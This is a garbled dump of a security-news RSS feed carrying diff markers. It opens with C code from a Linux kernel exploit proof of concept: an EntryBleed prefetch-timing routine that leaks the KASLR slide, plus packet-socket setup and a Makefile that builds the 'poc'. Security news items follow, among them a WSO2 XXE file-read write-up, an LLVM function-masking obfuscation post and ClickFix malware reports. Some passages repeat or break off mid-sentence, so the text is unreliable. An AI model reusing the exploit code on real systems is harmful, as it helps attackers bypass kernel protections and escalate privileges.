+    req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
+    int ret = ioctl(fd, SIOCSIFFLAGS, &req);
+    if(ret != 0) error_out("[setup_pg_vec] ioctl");
+    close(fd);
+}
+
+#define MIN_KERNEL_BASE 0xffffffff80000000ULL
+#define MAX_KERNEL_BASE 0xffffffffc0000000ULL
+#define KERNEL_ALIGN 0x200000ULL
+
+u64 probe_entry_nokpti(u64 addr)
+{
+    uint64_t a, b, c, d;
+    asm volatile (".intel_syntax noprefix;"
+        "cpuid;"    // serialization
+
+        "rdtscp;"
+        "mov r12, rax;"
+        "mov r13, rdx;" // record the start timestamp into temporary registers to avoid cache miss
+
+        "prefetcht0 qword ptr [%4];"
+        "prefetcht0 qword ptr [%4];"
+        "prefetcht0 qword ptr [%4];"
+        "mfence;"   // do the prefetch
+
+        "rdtscp;"
+        "mov %2, rax;"
+        "mov %3, rdx;" // save the end timestamp
+
+        "mov %0, r12;"
+        "mov %1, r13;" // save the start timestamp
+
+        "mfence;" // make sure everything is saved correctly
+        ".att_syntax;"
+        : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
+        : "r" (addr)
+        : "rax", "rbx", "rcx", "rdx", "r12", "r13");
+    a = (b << 32) | a;
+    c = (d << 32) | c;
+    return c - a;
+}
+
+u64 _entrybleed_get_kaslr_slide_nopti()
+{
+    int len = (MAX_KERNEL_BASE-MIN_KERNEL_BASE-0x1000000)/KERNEL_ALIGN;
+    u64 *times = malloc(sizeof(u64)*len);
+    for(int i=0; i<len; i++) {
+        u64 probe_addr = MIN_KERNEL_BASE + i*KERNEL_ALIGN + 0x1000000;
+        u64 elapsed, sum=0;
+        int cnt = 0;
+        while (cnt < 1000) {
+            u64 tmp = probe_entry_nokpti(probe_addr);
+            if (tmp > 1000) continue; // likely because of interrupts
+            cnt += 1;
+            sum += tmp;
+        }
+        elapsed = sum;
+        //printf("addr: %#llx, probe: %#llx, elapsed: %#llx\n", 0, probe_addr, elapsed);
+        times[i] = elapsed;
+    }
+
+    // calculate the mean
+    u64 total = 0;
+    for(int i=0; i<len; i++) {
+        total += times[i];
+    }
+    double mean = total/len;
+
+    // calculate the std
+    double tmp = 0;
+    for(int i=0; i<len; i++) {
+        tmp += ((double)times[i]-mean)*((double)times[i]-mean);
+    }
+    tmp /= len;
+    double std = sqrt(tmp);
+
+    u64 bar = (u64)(mean-std);
+    for(int i=0; i<len; i++) {
+        if(times[i] < bar) {
+            free(times);
+            return i*KERNEL_ALIGN;
+        }
+    }
+    return -1;
+}
+
+struct entry {
+    u64 value;
+    int cnt;
+};
+
+struct entry *get_entry(struct entry *entries, int entry_cnt, u64 value)
+{
+    for (int i=0; i<entry_cnt; i++) {
+        if (entries[i].value == value) return &entries[i];
+    }
+    return NULL;
+}
+
+// do a major vote
+#define VOTE_CNT 10
+u64 entrybleed_get_kaslr_slide_nopti()
+{
+    u64 candidates[VOTE_CNT];
+    struct entry entries[VOTE_CNT];
+    int cnt = 0;
+    int entry_cnt = 0;
+
+    // obtain the results first
+    while(cnt < VOTE_CNT) {
+        u64 result = _entrybleed_get_kaslr_slide_nopti();
+        if (result == -1) continue;
+        candidates[cnt++] = result;
+        printf("slide candidate: %#llx\n", result);
+    }
+
+    // do count
+    for(int i=0; i<cnt; i++) {
+        u64 value = candidates[i];
+        struct entry *entry = get_entry(entries, entry_cnt, value);
+        if (entry == NULL) {
+            entries[entry_cnt].value = value;
+            entries[entry_cnt].cnt = 1;
+            entry_cnt++;
+        } else {
+            entry->cnt += 1;
+        }
+    }
+
+    // find the most common slide
+    u64 best_slide = -1;
+    int best_cnt = 0;
+
+    for(int i=0; i<entry_cnt; i++) {
+        if (entries[i].cnt < best_cnt) continue;
+        if (entries[i].cnt > best_cnt || entries[i].value < best_slide) {
+            best_slide = entries[i].value;
+            best_cnt = entries[i].cnt;
+        }
+    }
+    return best_slide;
+}
+
+static void __attribute__((constructor)) init(void)
+{
+    // disable buffering
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    // very bad random seed lol
+    srand(time(NULL));
+
+    // initialize parameters
+    cpu_num = sysconf(_SC_NPROCESSORS_ONLN);
+}# Makefile
+all:
+	gcc -D_FILE_OFFSET_BITS=64 fusefs.c `pkg-config fuse --cflags --libs` -o fusefs
+	gcc -static -o poc poc.c utils.c -lm
+
+clean:
+	rm poc
+	rm fusefs]]></content:encoded></item><item><title>NSFW ChatGPT? OpenAI plans “grown-up mode” for verified adults</title><link>https://www.malwarebytes.com/blog/news/2025/10/nsfw-chatgpt-openai-plans-grown-up-mode-for-verified-adults</link><author></author><category>threatintel</category><pubDate>Tue, 28 Oct 2025 11:39:22 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[If you’ve had your fill of philosophical discussions with ChatGPT, CEO Sam Altman has news for you: the service will soon be able to engage in far less highbrow conversations of the sexual kind. That’s right—sexting is coming to ChatGPT. Are we really surprised?It marks a change in sentiment for the company, which originally banned NSFW content. In an October 14 post on X, Altman said the company had kept ChatGPT “pretty restrictive” to avoid creating mental health issues for vulnerable users. But now, he says, the company has learned from that experience and feels ready to “experiment more.”“In a few weeks, we plan to put out a new version of ChatGPT that allows people to have a personality that behaves more like what people liked about 4o (we hope it will be better!). If you want your ChatGPT to respond in a very human-like way, or use a ton of emoji, or act like a friend, ChatGPT should do it (but only if you want it, not because we are usage-maxxing).”He added that by December, as age-gating expands, ChatGPT will “allow even more, like erotica for verified adults.”This isn’t a sudden pivot. Things started to change at least as far back as May last year, when the company said in its Model Specification document that it was considering allowing ChatGPT to get a little naughty under the right circumstances. “We believe developers and users should have the flexibility to use our services as they see fit, so long as they comply with our usage policies. We’re exploring whether we can responsibly provide the ability to generate NSFW content in age-appropriate contexts through the API and ChatGPT. We look forward to better understanding user and societal expectations of model behavior in this area.”It followed up on that with another statement in a February 2025 update to the document, when it starting mulling a ‘grown-up mode’ while drawing a hard boundary around things like age, sexual deepfakes, and revenge porn.There’s no denying the money behind this move. Analysts believe people paid $2.7 billion worldwide for a little AI companionship last year, with the market expected to balloon to $24.5 billion by 2034—a staggering 24% annual growth rate.AI “girlfriends” and “boyfriends” already span everything from video-based virtual partners to augmented reality companions that can call you. Even big tech companies have been getting into it, with Elon Musk’s X launching a sexualized virtual companion called Ani that will apparently strip for you if you pester it enough.People have been getting down and dirty with technology for decades, of course (phone sex lines began in the early 1980s, and cam sites have been a thing for years). But AI changes the scale entirely. There’s no limit to automation, no need for human operators, and no guarantee that the users on the other side know where the boundaries are.We’re not judging, but the normal rules apply. This stuff is supposed to be for adults, which makes it more important than ever that parents monitor what their kids access online. It wasn’t the first time, either. Back in 2024, another AI girlfriend platform was breached, leaking users’ fantasies, chat histories, and profile data. That story showed just how vulnerable these apps can be when they mix emotional intimacy with poor security hygiene.As AI companionship becomes mainstream, breaches like these raise tough questions about how safely this kind of data can ever really be stored.For adults wanting a little alone time with an AI, remember to take a regular break and a sanity check. While Altman might think that OpenAI has “been able to mitigate the serious mental health issues,” experts still warn that relationships with increasingly lifelike AIs can create very real emotional risks. We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>US declines to join more than 70 countries in signing UN cybercrime treaty</title><link>https://databreaches.net/2025/10/28/us-declines-to-join-more-than-70-countries-in-signing-un-cybercrime-treaty/?pk_campaign=feed&amp;pk_kwd=us-declines-to-join-more-than-70-countries-in-signing-un-cybercrime-treaty</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 28 Oct 2025 11:19:34 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Social Engineering People’s Credit Card Details</title><link>https://www.schneier.com/blog/archives/2025/10/social-engineering-peoples-credit-card-details.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Tue, 28 Oct 2025 11:01:20 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Your highway toll payment is now past due, one text warns. You have U.S. Postal Service fees to pay, another threatens. You owe the New York City Department of Finance for unpaid traffic violations.The texts are ploys to get unsuspecting victims to fork over their credit-card details. The gangs behind the scams take advantage of this information to buy iPhones, gift cards, clothing and cosmetics.Criminal organizations operating out of China, which investigators blame for the toll and postage messages, have used them to make more than $1 billion over the last three years, according to the Department of Homeland Security.Making the fraud possible: an ingenious trick allowing criminals to install stolen card numbers in Google and Apple Wallets in Asia, then share the cards with the people in the U.S. making purchases half a world away.]]></content:encoded></item><item><title>Brida (Burp-Frida Bridge) 0.6 released! - HN Security</title><link>https://hnsecurity.it/blog/brida-0-6-released/</link><author>/u/0xdea</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 10:35:05 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Recently, Ole André Vadla Ravnås (@oleavr) & his team made some breaking changes to their great Fridadynamic instrumentation toolkit, removing Java, ObjC, and Swift runtime bridges from Frida’s GumJS runtime and removing or refactoring many JS APIs used by most Frida-based tools (like Brida). Consequently, many functionalities of Brida broke and required some changes to work properly with the latest Frida versions. I just released a new version of Brida (0.6) that is fully compatible with the latest versions of Frida and frida-compile.As a downside, starting with version 0.6, Brida will not be compatible with older Frida versions (<17). Unfortunately, as anyone who has worked with Frida on physical Android or iOS devices likely knows, it often happens that a specific version of Frida doesn’t work on a particular device, and in such situations an older Frida version could be useful. For such scenarios, I will leave version 0.6pre of Brida available in the Releases section of the GitHub repository. This version works with frida-compile@10.2.5 and frida<17.Some highlights on the updates brought by the last Brida version: to reflect changes in frida >= 17 (17.3.2 at the time of the release).Fixed compatibility with the last frida-compile versions (19.0.4 at the time of the release). to work with the last Java versions.Added “Host:Port” and “DeviceId” Frida connection modes.Added JS bypass for OkHttpHostname Verified.Added Gradle build configuration file.Improved Android root detection script.Finally, some direct links:]]></content:encoded></item><item><title>Is Your Google Workspace as Secure as You Think it is?</title><link>https://thehackernews.com/2025/10/is-your-google-workspace-as-secure-as.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyefAwM_xLJ_3Su0-Eqr3MGmfs-wjuOGIjuyyR3Adh4daM2ho6_h6VZVGAVSON8AzQQbskUSrJuBavVYRyKBYFC6AhdHQRqgwpAhebsB179jetDhl-MJl8ZUuE-mSQbBYp4h0ewYpZC7-D5oxWVWTMWmU8Dqc2sK0Tt5_gvOySGgR7umpGc-yJZfWnQ8o/s1600/unnamed.png" length="" type=""/><pubDate>Tue, 28 Oct 2025 10:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The New Reality for Lean Security Teams
 If you’re the first security or IT hire at a fast-growing startup, you’ve likely inherited a mandate that’s both simple and maddeningly complex: secure the business without slowing it down.
 Most organizations using Google Workspace start with an environment built for collaboration, not resilience. Shared drives, permissive settings, and constant]]></content:encoded></item><item><title>A phishing with invisible characters in the subject line, (Tue, Oct 28th)</title><link>https://isc.sans.edu/diary/rss/32428</link><author></author><category>threatintel</category><pubDate>Tue, 28 Oct 2025 10:12:32 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[While reviewing malicious messages that were delivered to our handler inbox over the past few days, I noticed that the “subject” of one phishing e-mail looked quite strange when displayed in the Outlook message list…]]></content:encoded></item><item><title>404 to arbitrary file read in WSO2 API Manager (CVE-2025-2905)</title><link>https://crnkovic.dev/wso2-404-to-arbitrary-file-read/</link><author>/u/crnkovic_</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 08:37:57 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ is a blind XXE vulnerability in WSO2 API Manager and other WSO2 products dependent on WSO2-Synapse.This is the first bug I found in WSO2 software. As you will see from posts in this series that follow this, it's hardly my most impactful find, but it was one of the more unexpected. That's mainly because of where it first showed up: a web server's default 404 response.WSO2 makes enterprise web application software. They have many products, most of which share a common codebase.This vulnerability impacts at least six WSO2 products. However, the subject of this post will be , as this is where I first discovered the bug, and it happens to be one of WSO2's more popular products.WSO2 API Manager is an API gateway and lifecycle management platform. It's sometimes compared to Kong or Apigee.In API Manager, there are two main components: the management console and the API gateway. This vulnerability affects . On the gateway, WSO2 API Manager brings in HTTP requests and forwards them to backend API servers. Common web servers like nginx and Apache can of course do the same thing; however, WSO2 adds features like authentication, rate limiting, and, most importantly, a fancy point-and-click user interface for teams to deploy and manage their APIs, i.e., the management console.WSO2 API Manager is built on top of Apache Synapse, a Java mediation framework and part of the Apache Axis2 ecosystem. However, WSO2 uses their own forks of these Apache dependencies, which introduces miscellaneous features used only by the WSO2 product family.WSO2's very insecure 404 Not FoundIn WSO2 API Manager, when you request a path that doesn't exist, you will receive a 404 response that looks like this:<am:fault xmlns:am="http://wso2.org/apimanager">
     <am:code>404</am:code>
@@ -135,8 +1095,9 @@ Content-Type: text/xml
         WSO2 Enterprise Integrator
       
         WSO2 Enterprise Service Bus
-       Reading binary stuff, or files with contents that otherwise confuse the XML parser, might cause an error. However, the majority of sensitive file types can be read, including , SSH private keys, miscellaneous configuration files, etc. The potential XSS vulnerability is not obvious to me. I know that there are ways to execute JavaScript within XML (e.g., by abusing namespaces), however since all browsers will percent-encode spaces,  and  characters, and tabs, I don't see how this is exploitable.2025-02-10: Report sent to WSO2.2025-02-27: WSO2 mislabels the vulnerability as requiring admin privileges; downgrades severity. I suggest that perhaps they've confused this with a different vulnerability.2025-03-11: WSO2 responds and corrects the severity.2025-05-05: WSO2 publishes CVE-2025-2905. They remind me that I'm not eligible for their Reward and Acknowledgement Program (a $50 gift voucher) because the discovery is outside the program's scope.2025-05-26: I discover and notify WSO2 about the new exploit in API Manager 3.0.0.2025-06-11 to 2025-08-18: A number of follow-ups.2025-08-19: WSO2 lets me know that they're finalising the updated CVE.2025-08-19: Notified WSO2 about the re-introduction of the vulnerability in API Manager 4.0.0.2025-09-04: WSO2 says they've privately notified their paying users.2025-10-17: WSO2 publishes revised advisory.]]></content:encoded></item><item><title>Chrome Zero-Day Exploited to Deliver Italian Memento Labs&apos; LeetAgent Spyware</title><link>https://thehackernews.com/2025/10/chrome-zero-day-exploited-to-deliver.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlit13ZALqbP4pKEZd8NpHu_edHw_YPa9HXncHsIbMJNBzjSN1JsbaFNhyphenhyphen6Ev8hKB2a4lmJjj-fBhgClb7MDjW6tAmiADb8Cd5JN4S3-fwI1dLURjypMyhZuNlXRx-ziWHpryutwG431Ifgfs1qpsS5zHgaV0wOkjiWrbUPjGpujCbGTnDU1R6BcmSy8Hn/s1600/chrome-exploit.png" length="" type=""/><pubDate>Tue, 28 Oct 2025 08:22:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The zero-day exploitation of a now-patched security flaw in Google Chrome led to the distribution of an espionage-related tool from Italian information technology and services provider Memento Labs, according to new findings from Kaspersky.
-The vulnerability in question is CVE-2025-2783 (CVSS score: 8.3), a case of sandbox escape which the company disclosed in March 2025 as having come under]]></content:encoded></item><item><title>Crafting self masking functions using LLVM</title><link>https://www.mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/</link><author>/u/gid0rah</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 08:03:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[LLVM compiler infrastructure is powerful because of its , , and rich intermediate representation (IR) that enables deep analysis and transformation of code. Unlike traditional compilers, LLVM separates the front end (language parsing) from the back end (code generation), allowing developers to support multiple languages and targets with minimal duplication. Its IR is language-agnostic and designed for optimization, making it ideal for building advanced tooling such as static analyzers, custom code generators, obfuscators, and JIT compilers. Additionally, LLVM’s extensive ecosystem—including Clang, LLD, and MLIR (Multi-Level Intermediate Representation)—makes it a robust foundation for research, experimentation, and production-grade compiler development.Clang/Clang++ is a frontend built on top of LLVM that parses and compiles source code written in C, C++, Objective-C, and Objective-C++. It translates this code into LLVM IR, which is then processed by LLVM’s backend. Together, Clang and LLVM form a flexible and extensible toolchain capable of supporting a wide range of languages, platforms, and custom compiler features.In this post, we will customize the LLVM compiler infrastructure to build a solution that enables self-masking capabilities for ordinary user-defined functions in a C++ source file. Self-masking means that a function remains in a masked (obfuscated or encrypted) state until it is invoked. Once execution enters the function, it is temporarily unmasked, and upon returning, it reverts back to its masked state.The Clang compiler, built on top of this customized LLVM, consistently generates binaries in which all functions are equipped with this masking behavior. Although the functions are not masked at compile time, the runtime design ensures that they are expected to be in a masked state during execution. This approach enhances binary protection and obfuscation without altering the original control flow or affecting the handling of arguments and return values.To impart self-masking capabilities to ordinary functions, we must manipulate the program’s control flow by injecting custom code during compilation.It is crucial that these modifications do not alter the original control flow or interfere with the handling of function arguments and return values.In this section, we will explore how to implement custom prologue and epilogue stubs for each function within a compilation unit. These stubs will manage execution flow and invoke a dedicated masking handler responsible for performing masking and unmasking operations.The custom Clang compiler we develop will integrate these transformations directly into the compiled binary. However, functions within the binary will remain unmasked at compile time. Instead, the design assumes that all functions are in a masked state at runtime.To enforce this, we introduce an additional component that handles entry point redirection and performs pre-CRT execution logic. This ensures that the original function bodies and their epilogues remain masked throughout the binary’s lifetime in memory.The PE file generated by our custom Clang++ compiler includes two custom sections, as illustrated in the image below:The  section stores the XOR key along with metadata required to identify the start and length of each function. We will explore the structure and purpose of this section in detail in the following sections. A high-level data layout is illustrated in the image below:The  section contains shellcode that serves as the entry point for the PE file and is executed immediately upon program launch.Our custom LLVM implementation does not indiscriminately mask every function within a compilation unit; instead, it selectively applies modifications only to those functions explicitly chosen by the user. We need to provide users with an intuitive and efficient mechanism to register functions that require masking.A custom section named  is created to hold XOR key and function meta data.__attribute__((section(".funcmeta")))
+       Reading binary stuff, or files with contents that otherwise confuse the XML parser, might cause an error. However, the majority of sensitive file types can be read, including , SSH private keys, miscellaneous configuration files, etc. The potential XSS vulnerability is not obvious to me. I know that there are ways to execute JavaScript within XML (e.g., by abusing namespaces), however since all browsers will percent-encode spaces,  and  characters, and tabs, I don't see how this is exploitable.2025-02-10: Report sent to WSO2.2025-02-27: WSO2 mislabels the vulnerability as requiring admin privileges; downgrades severity. I suggest that perhaps they've confused this with a different vulnerability.2025-03-11: WSO2 responds and corrects the severity.2025-05-05: WSO2 publishes CVE-2025-2905. They remind me that I'm not eligible for their Reward and Acknowledgement Program (a $50 gift voucher) because the discovery is outside the program's scope.2025-05-26: I discover and notify WSO2 about the new exploit in API Manager 3.0.0.2025-06-11 to 2025-08-18: A number of follow-ups.2025-08-19: WSO2 lets me know that they're finalising the updated CVE.2025-08-19: Notified WSO2 about the re-introduction of the vulnerability in API Manager 4.0.0.2025-09-04: WSO2 says they've privately notified their paying users.2025-10-17: WSO2 publishes revised advisory.]]></content:encoded></item><item><title>Chrome Zero-Day Exploited to Deliver Italian Memento Labs&apos; LeetAgent Spyware</title><link>https://thehackernews.com/2025/10/chrome-zero-day-exploited-to-deliver.html</link><author></author><category>security</category><pubDate>Tue, 28 Oct 2025 08:22:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Chrome Zero-Day Exploited to Deliver Italian Memento Labs' LeetAgent Spyware
+            The zero-day exploitation of a now-patched security flaw in Google Chrome led to the distribution of an espionage-related tool from Italian information technology and services provider Memento Labs, a ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CISA Warns Of Critical Veeder-Root Vulnerabilities Let Attackers Execute System-level Commands</title><link>https://cybersecuritynews.com/cisa-warns-of-critical-veeder-root-vulnerabilities/</link><author></author><category>security</category><pubDate>Tue, 28 Oct 2025 08:04:33 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
+            The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has issued a stark advisory highlighting two severe vulnerabilities in Veeder-Root’s TLS4B Automatic Tank Gauge System, a critical tool ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Crafting self masking functions using LLVM</title><link>https://www.mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/</link><author>/u/gid0rah</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 08:03:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[LLVM compiler infrastructure is powerful because of its , , and rich intermediate representation (IR) that enables deep analysis and transformation of code. Unlike traditional compilers, LLVM separates the front end (language parsing) from the back end (code generation), allowing developers to support multiple languages and targets with minimal duplication. Its IR is language-agnostic and designed for optimization, making it ideal for building advanced tooling such as static analyzers, custom code generators, obfuscators, and JIT compilers. Additionally, LLVM’s extensive ecosystem—including Clang, LLD, and MLIR (Multi-Level Intermediate Representation)—makes it a robust foundation for research, experimentation, and production-grade compiler development.Clang/Clang++ is a frontend built on top of LLVM that parses and compiles source code written in C, C++, Objective-C, and Objective-C++. It translates this code into LLVM IR, which is then processed by LLVM’s backend. Together, Clang and LLVM form a flexible and extensible toolchain capable of supporting a wide range of languages, platforms, and custom compiler features.In this post, we will customize the LLVM compiler infrastructure to build a solution that enables self-masking capabilities for ordinary user-defined functions in a C++ source file. Self-masking means that a function remains in a masked (obfuscated or encrypted) state until it is invoked. Once execution enters the function, it is temporarily unmasked, and upon returning, it reverts back to its masked state.The Clang compiler, built on top of this customized LLVM, consistently generates binaries in which all functions are equipped with this masking behavior. Although the functions are not masked at compile time, the runtime design ensures that they are expected to be in a masked state during execution. This approach enhances binary protection and obfuscation without altering the original control flow or affecting the handling of arguments and return values.To impart self-masking capabilities to ordinary functions, we must manipulate the program’s control flow by injecting custom code during compilation.It is crucial that these modifications do not alter the original control flow or interfere with the handling of function arguments and return values.In this section, we will explore how to implement custom prologue and epilogue stubs for each function within a compilation unit. These stubs will manage execution flow and invoke a dedicated masking handler responsible for performing masking and unmasking operations.The custom Clang compiler we develop will integrate these transformations directly into the compiled binary. However, functions within the binary will remain unmasked at compile time. Instead, the design assumes that all functions are in a masked state at runtime.To enforce this, we introduce an additional component that handles entry point redirection and performs pre-CRT execution logic. This ensures that the original function bodies and their epilogues remain masked throughout the binary’s lifetime in memory.The PE file generated by our custom Clang++ compiler includes two custom sections, as illustrated in the image below:The  section stores the XOR key along with metadata required to identify the start and length of each function. We will explore the structure and purpose of this section in detail in the following sections. A high-level data layout is illustrated in the image below:The  section contains shellcode that serves as the entry point for the PE file and is executed immediately upon program launch.Our custom LLVM implementation does not indiscriminately mask every function within a compilation unit; instead, it selectively applies modifications only to those functions explicitly chosen by the user. We need to provide users with an intuitive and efficient mechanism to register functions that require masking.A custom section named  is created to hold XOR key and function meta data.__attribute__((section(".funcmeta")))
 uint32_t myfuncsec_key = 0x12345678;The function metadata consists of the function’s start address and the length of its body. We encapsulate this information in a structure named , as shown below. For each registered function, an instance of  is placed in the  section.struct FunctionMetaData 
 {
     void* func;
@@ -3705,9 +4666,7 @@ The pedigree of Softwar ... Vulnerabilities has been mentioned in this article.]
             October 24, 2025Microsoft’s Windows Server Update Services (WSUS) recently faced a critical security threat that has sent shockwaves through IT security communities worldwide. The vulnerability, track ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Newly Patched Critical Microsoft WSUS Flaw Comes Under Active Exploitation</title><link>https://thehackernews.com/2025/10/microsoft-issues-emergency-patch-for.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiboN42WiQTI7VcMEGEDyMaY3ZP7VsruF2cHNgK4XQ2SxW0adaaMaJYfa_3B5Og4rvc1KF9HS1L7IxA-jSa_ZWMOz5kAKexTlsbZHomhllf8esxYBqcv3-pL7GY5CCb7qZaSxFaM2s3sbLR6cw-KlYMQ0ZnyWbYpjxHph9tMZxDxGdsf6jQ8kdBWYsMdvol/s1600/windows-update.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 16:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Microsoft on Thursday released out-of-band security updates to patch a critical-severity Windows Server Update Service (WSUS) vulnerability with a proof-of-concept (Poc) exploit publicly available and has come under active exploitation in the wild.
 The vulnerability in question is CVE-2025-59287 (CVSS score: 9.8), a remote code execution flaw in WSUS that was originally fixed by the tech giant]]></content:encoded></item><item><title>Critical WSUS flaw in Windows Server now exploited in attacks</title><link>https://www.bleepingcomputer.com/news/security/hackers-now-exploiting-critical-windows-server-wsus-flaw-in-attacks/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 24 Oct 2025 16:28:14 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Attackers are now exploiting a critical-severity Windows Server Update Services (WSUS) vulnerability, which already has publicly available proof-of-concept exploit code. [...]]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 43</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-43-7/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/10/GBU_week43.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 16:04:31 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[The Good | Europol Dismantles Global SIM-Box Fraud Network, that powered over 3,200 fraud cases and caused at least €4.5 million in damages. The network operated 1,200 SIM-box devices containing some 40,000 SIM cards, enabling criminals to rent phone numbers registered to individuals in more than 80 countries. These were then used to create 49 million fraudulent online accounts for crimes including phishing, investment fraud, extortion, impersonation, and migrant smuggling.The illegal service, run through  and , worked by selling access to “fast and secure temporary” phone numbers marketed for anonymous communication and account verification. GoGetSMS also offered users a way to monetize their own SIM cards. However, reviews suggested it was a front for large-scale identity fraud, , which allowed perpetrators worldwide to hide their identities while conducting telecom-based fraud.After running coordinated raids across Austria, Estonia, Finland, and Latvia, police arrested seven suspects in total. They also seized five servers, the two websites, hundreds of thousands of SIM cards, €431,000 deposited in bank accounts, €266,000 in crypto, and four luxury vehicles. Both domains have been taken down and now display official law enforcement banners.So far, authorities have linked the network to 1,700 fraud cases in Austria and 1,500 in Latvia, with combined losses adding up to nearly €5 million. Europol’s forensic analysis of the seized servers aims to identify customers of the illegal service.The Bad | Jingle Thief Exploits Cloud Identities for Large-Scale Gift Card FraudA new report from security researchers details the activities of . Active since at least 2021, the group targets retail and consumer services organizations through phishing and smishing campaigns designed to steal Microsoft 365 credentials.Once inside, the attackers exploit cloud-based infrastructure to impersonate legitimate users, gain unauthorized access to sensitive data, and manipulate gift card issuance systems. With their campaigns focusing on mapping cloud networks, attackers can move laterally across accounts and avoid detection through stealthy tactics such as creating inbox rules, forwarding emails, and registering rogue authenticator apps to bypass MFA in M365.Unlike traditional malware-driven attacks, . This approach allows them to maintain access for many months while issuing or selling unauthorized gift cards for profit on gray markets.Researchers also observed a major wave of Jingle Thief activity between April and May 2025, during which the group compromised more than 60 user accounts within a single organization. The attackers conducted extensive reconnaissance in SharePoint and OneDrive, searching for financial workflows, IT documentation, and virtual machine configurations, all tied to gift card systems.Exploiting cloud identities rather than endpoints furthers the trend of cloud-based cybercrime, where phished credentials and identity abuse enable financially motivated actors to scale operations while remaining under the radar. Jungle Thief’s campaign is a reminder to prioritize identity-based monitoring and cloud-native security measures that provide full visibility and real-time detection.The Ugly | PhantomCaptcha Spearphishing Targets Ukraine’s Relief Networks and humanitarian organizations such as the International Red Cross, UNICEF, the Norwegian Refugee Council, and other NGOs linked to war relief efforts.Launched on October 8, 2025, the operation began with an impersonation of the Ukrainian President’s Office, distributing weaponized PDF attachments that redirected victims to a fake Zoom site (). There, a fake Cloudflare CAPTCHA lured users into copying and pasting malicious PowerShell commands – a ClickFix technique designed to bypass traditional endpoint controls by tricking victims into executing the malware themselves.Once running, the script deployed a multi-stage PowerShell payload leading to a WebSocket remote access trojan (RAT) hosted on Russian-owned infrastructure. The RAT enables arbitrary command execution, data exfiltration, and the potential deployment of further malware through encrypted WebSocket communications. Although investigations show that .SentinelLABS linked the campaign to an additional Android-based espionage effort hosted on , which distributes spyware-laden APKs disguised as adult entertainment or cloud storage apps designed to harvest contacts, media files, and geolocation data.While attribution remains unconfirmed, technical overlaps, including the ClickFix lure and Russian-hosted C2s, suggest possible ties to COLDRIVER (UNC4057 or Star Blizzard), a threat group linked to Russia’s Federal Security Service (FSB). PhantomCaptcha is an example of a highly organized and adaptive adversary, able to blend social engineering, short-lived but highly compartmentalized infrastructure, and cross-platform espionage to target Ukraine’s humanitarian and government sectors.]]></content:encoded></item><item><title>Amazon: This week’s AWS outage caused by major DNS failure</title><link>https://www.bleepingcomputer.com/news/technology/amazon-this-weeks-aws-outage-caused-by-major-dns-failure/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 24 Oct 2025 15:33:58 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Amazon says a major DNS failure was behind a massive AWS (Amazon Web Services) outage that took down many websites and online services on Monday. [...]]]></content:encoded></item><item><title>Fake LastPass death claims used to breach password vaults</title><link>https://www.bleepingcomputer.com/news/security/fake-lastpass-death-claims-used-to-breach-password-vaults/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 24 Oct 2025 14:47:48 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[LastPass is warning customers of a phishing campaign 